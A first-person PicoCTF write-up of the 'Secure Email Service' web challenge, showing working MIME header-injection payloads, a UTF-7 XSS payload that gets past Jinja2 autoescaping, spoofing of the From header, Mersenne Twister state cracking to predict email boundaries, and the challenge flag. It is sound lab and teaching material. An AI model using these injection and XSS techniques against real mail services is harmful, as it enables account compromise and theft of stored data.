# Secure Email Service — PicoCTF

**Category:** Web Exploitation  
**Difficulty:** Hard  

---

## overview

after logging in as `user@ses` by getting the pass from `/api/password` we saw we got a mail from `admin@ses` — we can send our own mail or reply to his mail

from `admin_bot.py` we can see that the bot logs in to `admin@ses` with the flag in its local storage, then clicks on the first email and replies to it with a hardcoded text.

we can also see this is a jinja2 app.

---

## source code analysis

from `main.py` we see `autoescape=True` which means jinja2 will automatically escape dangerous HTML characters

various endpoints:

```
1. /api/login          - for login creds check
2. /api/me             - shows users username
3. /api/password       - shows password for user
4. /api/emails         - shows users email
5. /api/email/{email_id} - shows the emails content
6. /api/mark_read/{email_id} - marks the email as read
7. /api/root_cert      - shows root public key
8. /api/admin_bot      - starts admin_bot
```

but the most interesting:

```
9. /api/send:
   - for sending the email but it also checks if public_key is present or not
   - if there is no public_key then the email is sent simply
   - but if there is a public key then the body and subject is rendered using 'template.render'
```

a `public_key` is a digital signature sent along with the email to verify your identity. it checks whether the certificate is signed by the `root_cert` or not to validate if the `public_cert` is legit

in `main.py` the code just checks whether the length of the `public_key` sent is 0 or not but the real authentication happens using `/wasm/openssl.wasm` which does:

```bash
openssl cms -verify -in /email.eml -CAfile /ca.crt
```

in `email.html` we saw that after jinja2 uses autoescape to encode dangerous elements, in the receiver's browser the encoded text (the HTML entity) gets only *shown* as its original way — so it doesnt execute

running the CTF on our own machine using docker on the source code provided we saw that when the admin sends a message it follows a template but our emails are just normal html which means admin's html is being rendered using `template.jinja2`

its answer lies in our earlier finding on the endpoint `/api/send` — in `init.py` we saw that admin has private and public key but our user doesnt

---

## MIME format & email injection

but the fact is, even though its a web application, at the end of the day it is sending email. what is happening when we send the email:

```
1. the raw email in MIME format is sent to the smtp server (in docker our own machine) where it is stored
2. then the receiver fetches it using the api from the redis server
```

in this CTF after receiving the email, the receiver uses `/wasm/parser.wasm` and `/wasm/openssl.wasm` to parse contents from the raw format before showing it. there are two parsers:

```
1. openssl.wasm: parses S/MIME signed emails using raw signed email + root certificate to show only the verified content
2. parser.wasm: parses content from the raw email into json format (sender, subject, body, and most importantly html if html=true)
```

one of the most common attacks in emails is email injection in the MIME format. here's how a MIME email looks:

```
From: "Sender" <sender@example.com>
To: "Recipient" <recipient@example.com>
Subject: Simple MIME Example
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="boundary-string"

--boundary-string
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

Hello, this is the plain text version.

--boundary-string
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 7bit

<html><body><h1>Hello!</h1><p>This is the <b>HTML</b> version.</p></body></html>

--boundary-string--
```

in this case we control `To:` and `Subject:` so if we put something like `admin@ses\nCustom-Header: test` we can try to inject our own custom header

trying it in the `to:` header didnt work as it just said user not found but in the `subject` it worked!! (well not exactly because it gave an Internal Server Error but now we know its working)

in the docker logs we found whats causing the error:

```
File "/usr/local/lib/python3.11/email/header.py", line 385, in encode
ses-1    |     raise HeaderParseError("header value appears to contain "
ses-1    | email.errors.HeaderParseError: header value appears to contain an embedded header: 'test\nFrom:admin@ses'
```

Python's email library is detecting our header injection and rejecting it

from the code of python library `email/header.py` we found it can be bypassed by just adding a space after `:` — something like `\nFrom : admin@ses`

after trying to make our own email by copying the MIME format and injecting it in the email, it showed injected (as there was no extra email showing after our `\n`) but the code was also not executing

our first try:

```json
{
  "to": "admin@ses",
  "subject": "subject \nMIME-Version : 1.0 \nContent-Type : multipart/mixed; boundary=\"===============9146220385756418443==\" \n\n--===============9146220385756418443== \nContent-Type : text/html; charset='us-ascii' \nMIME-Version : 1.0 \nContent-Transfer-Encoding : 7bit \n\n<!DOCTYPE html><script>alert(1)</script></html> \n\n--===============9146220385756418443==",
  "body": "Content"
}
```

i also saw that if we put `text/plain` instead of `text/html` we can see the whole code — from it we saw that some of our html characters were getting escaped

i tried base64 encoding the content but still didnt work

i turned autoescape in the source code to false to see if that is what is causing the error and using:

```json
{
  "to": "admin@ses",
  "subject": "subject \nMIME-Version : 1.0 \nContent-Type : multipart/mixed; boundary=\"===============9146220385756418443==\" \n\n--===============9146220385756418443== \nContent-Type : text/html; charset='us-ascii' \nMIME-Version : 1.0 \nContent-Transfer-Encoding : 7bit \n\n<img src=x onerror=alert(1)> \n\n--===============9146220385756418443==",
  "body": "Content"
}
```

it executed alert and after turning autoescape back on it wasnt — so we had to focus on bypassing it

to bypass it i found we can use UTF-7 encoding but it would also not work because the boundary is getting defined at the start so our custom boundary wouldnt matter to it and would just be shown as plain text

i tested it by setting a hardcoded boundary in `util.py` and then sending the same email with our email injection — the alert worked

so we somehow have to predict the boundary of admin. but that would come later, first lets focus on getting XSS

---

## getting XSS on admin

i logged on the `user@ses` account and tried to send the payload to the admin but then came another problem — if we directly send the payload it will inject on our own email and when we reply, the subject would just be the non-escaped `subject`

the solution was relatively simple, it was just to encode the message in base64. the payload we sent in subject which worked:

```json
{
  "to": "admin@ses",
  "subject": "=?UTF-8?B?c3ViamVjdCAKTUlNRS1WZXJzaW9uIDogMS4wIApDb250ZW50LVR5cGUgOiBtdWx0aXBhcnQvbWl4ZWQ7IGJvdW5kYXJ5PSJNWUNVU1RPTUJPVU5EQVJZMTIzNDUiIAoKLS1NWUNVU1RPTUJPVU5EQVJZMTIzNDUgCkNvbnRlbnQtVHlwZSA6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtNyAKTUlNRS1WZXJzaW9uIDogMS4wIApDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nIDogN2JpdAoKK0FEdy1pbWcrQUNBLXNyYytBRDAteCtBQ0Etb25lcnJvcitBRDAtYWxlcnQoMSkrQUQ0LQoKLS1NWUNVU1RPTUJPVU5EQVJZMTIzNDUK?=",
  "body": "Content"
}
```

its subject is the base64 encoded version of:

```
subject
MIME-Version : 1.0
Content-Type : multipart/mixed; boundary="MYCUSTOMBOUNDARY12345"

--MYCUSTOMBOUNDARY12345
Content-Type : text/html; charset=UTF-7
MIME-Version : 1.0
Content-Transfer-Encoding : 7bit

+ADw-img+ACA-src+AD0-x+ACA-onerror+AD0-alert(1)+AD4-

--MYCUSTOMBOUNDARY12345
```

but even if we get the admin to reply to us, how do we get XSS on his side? its by NOT making him send his reply to us — but rather to himself. we can achieve this by using both `From` and `subject` header in the email injection, making it appear that the email is coming from `admin@ses` while also adding another subject header with our base64 encoded payload

the final payload to test `alert(1)`:

```json
{
  "to": "admin@ses",
  "subject": "subject \nFrom : admin@ses \nsubject : =?UTF-8?B?Ck1JTUUtVmVyc2lvbiA6IDEuMCAKQ29udGVudC1UeXBlIDogbXVsdGlwYXJ0L21peGVkOyBib3VuZGFyeT0iTVlDVVNUT01CT1VOREFSWTEyMzQ1IiAKCi0tTVlDVVNUT01CT1VOREFSWTEyMzQ1IApDb250ZW50LVR5cGUgOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTcgCk1JTUUtVmVyc2lvbiA6IDEuMCAKQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZyA6IDdiaXQKCitBRHctaW1nK0FDQS1zcmMrQUQwLXgrQUNBLW9uZXJyb3IrQUQwLWFsZXJ0KDEpK0FENC0KCi0tTVlDVVNUT01CT1VOREFSWTEyMzQ1Cg==?=",
  "body": "Content"
}
```

---

## predicting the boundary — cracking Mersenne Twister

now comes the real problem — how do we predict the boundary?

from the source code:

```python
def _make_boundary(text=None):
    if text is None:
        timestamp = time.time_ns()
        token = random.randrange(sys.maxsize)
        return f'{"=" * 15}{timestamp}{token}=='

    b = text
    counter = 0
    while True:
        cre = cls._compile_re('^--' + re.escape(b) + '(--)?$', re.MULTILINE)
        if not cre.search(text):
            break
        b = text + '.' + str(counter)
        counter += 1
    return b
```

Python uses the Mersenne Twister PRNG for `random` — its not cryptographically secure! if we collect ~624 outputs we can predict all future outputs

the Mersenne Twister has an internal state of 624 integers (each 32-bit). every time we call `random.randrange()` or `random.getrandbits()` it:

```
1. uses the current state to generate a random number
2. updates the state in a predictable way
```

key property: if you observe 624 consecutive 32-bit outputs, you can reconstruct the entire internal state and predict all future outputs

`random.randrange(sys.maxsize)` generates a 63-bit integer — done by taking two 32-bit outputs from MT19937, masking one bit, and combining them. so each boundary reveals ~63 bits of the RNG's output stream

in summary how the Mersenne Twister works:

```
1. seed starts it all → generates initial 624 compartments (32-bit integers)
2. to generate output: takes current compartment → applies tempering (bit math) → outputs result
3. tempering is reversible: output → untemper() → original compartment value
4. we collect outputs (email boundaries) → reverse-temper each → learn compartment values
5. once we know all 624 compartments → we can predict everything!
```

also, the regex `^--boundary(--)?$` looks for complete lines that are exactly the boundary marker — if we inject `--===============12345==` with leading spaces, it wont match because the line starts with spaces. thats how we bypass the collision check!

using a public exploit `z3_crack` we cracked the internal state — the full `mt[624]` array and the current index (0-623)

one more thing — `z3_crack` only accepted 32-bit integers so we had to split the boundaries in the format:

```
first  = 32bit
second = 31bit + '?' (here using '?' tries both 0 and 1)
```

so now as we know the current full array we can predict the next (already done by the cracker)

made a python script to predict the admin's boundary and send him the payload — *(script deleted, completed this ctf a while ago)*

```
flag: picoCTF{always_a_step_ahead_fb2a1a8c}
```

---
